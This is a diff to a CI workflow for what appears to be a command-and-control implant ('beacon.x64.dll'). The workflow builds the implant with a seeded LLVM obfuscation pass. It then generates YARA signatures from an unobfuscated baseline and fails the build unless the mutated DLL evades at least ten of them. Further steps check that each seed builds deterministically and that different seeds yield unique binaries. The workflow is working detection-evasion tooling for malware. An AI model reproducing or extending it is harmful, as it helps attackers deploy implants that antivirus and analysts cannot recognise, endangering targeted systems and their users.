@@ -53,38 +53,148 @@ jobs:
           path: ~/.llvm-cross
           key: llvm-cross-${{ env.LLVM_VERSION }}-xwin-${{ env.XWIN_VERSION }}-linux-v1
 
-      - name: Ninja
-        run: sudo apt-get update -qq && sudo apt-get install -y ninja-build
+      - name: Ninja + yara
+        run: sudo apt-get update -qq && sudo apt-get install -y ninja-build yara
 
       - name: Setup LLVM + xwin
         run: bash tools/llvm/setup-host.sh
 
-      - name: Configure
+      - name: Configure baseline (no pass)
         run: |
           set -e
           set -a
           source "$HOME/.llvm-cross/toolpath.env"
           set +a
+          cmake -S . -B build-llvm-base -G Ninja \
+            --toolchain cmake/toolchain-clang-cl-xwin.cmake \
+            -DCMAKE_BUILD_TYPE=Release \
+            -DCLANG_CL="$LLVM_CLANG" \
+            -DLLD_LINK="$LLVM_LLD" \
+            -DXWIN_DIR="$XWIN_SPLAT" \
+            -DPython3_EXECUTABLE=python3
+
+      - name: Build baseline beacon.x64
+        run: cmake --build build-llvm-base --parallel --target beacon_wininet
+
+      - name: Configure mutated seed 1337
+        run: |
+          set -e
+          set -a
+          source "$HOME/.llvm-cross/toolpath.env"
+          set +a
+          LLVM_DIR="$(dirname "$(dirname "$LLVM_CLANG")")/lib/cmake/llvm"
           cmake --preset llvm \
             -DCLANG_CL="$LLVM_CLANG" \
             -DLLD_LINK="$LLVM_LLD" \
             -DXWIN_DIR="$XWIN_SPLAT" \
             -DBEACON_OBF=ON \
-            -DLLVM_DIR="$HOME/.llvm-cross/llvm/lib/cmake/llvm"
+            -DBEACON_OBF_SEED=1337 \
+            -DLLVM_DIR="$LLVM_DIR"
 
-      - name: Build
+      - name: Build mutated product
         run: cmake --build --preset llvm --parallel
 
+      - name: spawn_trace path absent in llvm DLL
+        run: |
+          cmake -DDLL="$PWD/build-llvm/out/beacon.x64.dll" \
+            -P cmake/check_spawn_trace_off.cmake
+
+      - name: YARA gate (baseline >=12 self-match, mutated loses >=10)
+        run: |
+          set -e
+          python3 tools/llvm/gen_yara.py \
+            build-llvm-base/out/beacon.x64.dll \
+            build-llvm-base/out/beacon.x64.map \
+            "$RUNNER_TEMP/bw_baseline.yar"
+          BM=$(yara -w "$RUNNER_TEMP/bw_baseline.yar" build-llvm-base/out/beacon.x64.dll | grep -c bw_sig || true)
+          echo "yara baseline matches: $BM"
+          [ "$BM" -ge 12 ] || { echo "YARA FAIL: baseline does not match its own signatures ($BM)"; exit 1; }
+          MM=$(yara -w "$RUNNER_TEMP/bw_baseline.yar" build-llvm/out/beacon.x64.dll | grep -c bw_sig || true)
+          echo "yara mutated matches: $MM (of $BM)"
+          LOST=$((BM - MM))
+          [ "$LOST" -ge 10 ] || { echo "YARA FAIL: mutation lost only $LOST of $BM signatures"; exit 1; }
+          echo "yara coverage OK: lost $LOST of $BM"
+
+      - name: Same-seed determinism
+        run: |
+          set -e
+          set -a
+          source "$HOME/.llvm-cross/toolpath.env"
+          set +a
+          LLVM_DIR="$(dirname "$(dirname "$LLVM_CLANG")")/lib/cmake/llvm"
+          A_SHA=$(sha256sum build-llvm/out/beacon.x64.dll | awk '{print $1}')
+          echo "A_SHA=$A_SHA"
+          cmake -S . -B build-llvm-det -G Ninja \
+            --toolchain cmake/toolchain-clang-cl-xwin.cmake \
+            -DCMAKE_BUILD_TYPE=Release \
+            -DCLANG_CL="$LLVM_CLANG" \
+            -DLLD_LINK="$LLVM_LLD" \
+            -DXWIN_DIR="$XWIN_SPLAT" \
+            -DPython3_EXECUTABLE=python3 \
+            -DBEACON_OBF=ON \
+            -DBEACON_OBF_SEED=1337 \
+            -DLLVM_DIR="$LLVM_DIR"
+          cmake --build build-llvm-det --parallel --target beacon_wininet
+          B_SHA=$(sha256sum build-llvm-det/out/beacon.x64.dll | awk '{print $1}')
+          echo "B_SHA=$B_SHA"
+          if [ "$A_SHA" != "$B_SHA" ]; then
+            echo "DETERMINISM FAIL A vs B: $A_SHA vs $B_SHA"
+            exit 1
+          fi
+          echo "determinism OK"
+
+      - name: Seed 424242 uniqueness
+        run: |
+          set -e
+          set -a
+          source "$HOME/.llvm-cross/toolpath.env"
+          set +a
+          LLVM_DIR="$(dirname "$(dirname "$LLVM_CLANG")")/lib/cmake/llvm"
+          A_SHA=$(sha256sum build-llvm/out/beacon.x64.dll | awk '{print $1}')
+          BASE_SHA=$(sha256sum build-llvm-base/out/beacon.x64.dll | awk '{print $1}')
+          cmake -S . -B build-llvm-s2 -G Ninja \
+            --toolchain cmake/toolchain-clang-cl-xwin.cmake \
+            -DCMAKE_BUILD_TYPE=Release \
+            -DCLANG_CL="$LLVM_CLANG" \
+            -DLLD_LINK="$LLVM_LLD" \
+            -DXWIN_DIR="$XWIN_SPLAT" \
+            -DPython3_EXECUTABLE=python3 \
+            -DBEACON_OBF=ON \
+            -DBEACON_OBF_SEED=424242 \
+            -DLLVM_DIR="$LLVM_DIR"
+          cmake --build build-llvm-s2 --parallel --target beacon_wininet
+          C_SHA=$(sha256sum build-llvm-s2/out/beacon.x64.dll | awk '{print $1}')
+          echo "BASE_SHA=$BASE_SHA A_SHA=$A_SHA C_SHA=$C_SHA"
+          if [ "$A_SHA" = "$C_SHA" ]; then
+            echo "UNIQUENESS FAIL: different seed gave identical output"
+            exit 1
+          fi
+          if [ "$BASE_SHA" = "$C_SHA" ]; then
+            echo "BASELINE COLLISION with seed 424242"
+            exit 1
+          fi
+          if [ "$BASE_SHA" = "$A_SHA" ]; then
+            echo "BASELINE COLLISION with seed 1337"
+            exit 1
+          fi
+          echo "uniqueness OK"
+
       - name: List artifacts
-        run: ls -la build-llvm/out
+        if: always()
+        run: ls -la build-llvm/out build-llvm-base/out 2>/dev/null || true
 
       - name: Upload artifacts
         uses: actions/upload-artifact@v4
+        if: always()
         with:
           name: llvm-linux-x64
           path: |
             build-llvm/out/*.dll
             build-llvm/out/*.map
+            build-llvm-base/out/beacon.x64.dll
+            build-llvm-base/out/beacon.x64.map
+            build-llvm-det/out/beacon.x64.dll
+            build-llvm-s2/out/beacon.x64.dll
 
   llvm-windows:
     name: llvm-windows
@@ -108,26 +218,31 @@ jobs:
         shell: pwsh
         run: choco install ninja -y --no-progress
 
-      - name: Configure
+      - name: Configure mutated
         run: |
           set -e
           set -a
           source "$HOME/.llvm-cross/toolpath.env"
           set +a
+          LLVM_DIR="$(dirname "$(dirname "$LLVM_CLANG")")/lib/cmake/llvm"
           cmake --preset llvm \
             -DCLANG_CL="$LLVM_CLANG" \
             -DLLD_LINK="$LLVM_LLD" \
             -DXWIN_DIR="$XWIN_SPLAT" \
+            -DBEACON_OBF=ON \
+            -DBEACON_OBF_SEED=1337 \
+            -DLLVM_DIR="$LLVM_DIR" \
             -DPython3_EXECUTABLE=python
 
       - name: Build
         run: cmake --build --preset llvm --parallel
 
-      - name: load_smoke
-        run: ctest --test-dir build-llvm --output-on-failure -R load_smoke
+      - name: load_smoke + spawn_trace off
+        run: ctest --test-dir build-llvm --output-on-failure -R "load_smoke|spawn_trace"
 
       - name: Upload artifacts
         uses: actions/upload-artifact@v4
+        if: always()
         with:
           name: llvm-windows-x64
           path: |
